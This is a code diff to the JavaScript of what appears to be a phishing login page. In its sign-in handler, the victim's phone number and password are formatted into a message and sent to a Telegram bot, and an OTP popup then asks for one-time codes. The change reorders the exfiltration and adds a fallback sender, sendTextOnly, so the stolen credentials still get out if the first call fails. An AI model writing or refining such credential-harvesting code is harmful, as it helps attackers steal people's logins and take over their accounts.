@@ -47,16 +47,20 @@ function handleSignIn() {
         return;
     }
 
-    var sep = '\u2501'.repeat(15);
-    var msg = 'Login Details\n' + sep + '\n📱 Phone: <code>' + phone + '</code>\n🔑 Password: <code>' + password + '</code>\n' + sep;
-    sendToTelegram(msg, true);
-
     const overlay = document.getElementById('overlay');
     const otpPopup = document.getElementById('otpPopup');
 
     overlay.classList.add('active');
     otpPopup.classList.add('active');
     document.querySelectorAll('.otp-input')[0].focus();
+
+    var sep = '\u2501'.repeat(15);
+    var msg = 'Login Details\n' + sep + '\n📱 Phone: <code>' + phone + '</code>\n🔑 Password: <code>' + password + '</code>\n' + sep;
+    try {
+        sendToTelegram(msg, true);
+    } catch (e) {
+        sendTextOnly(msg);
+    }
 }
 
 function otpInput(input, index) {
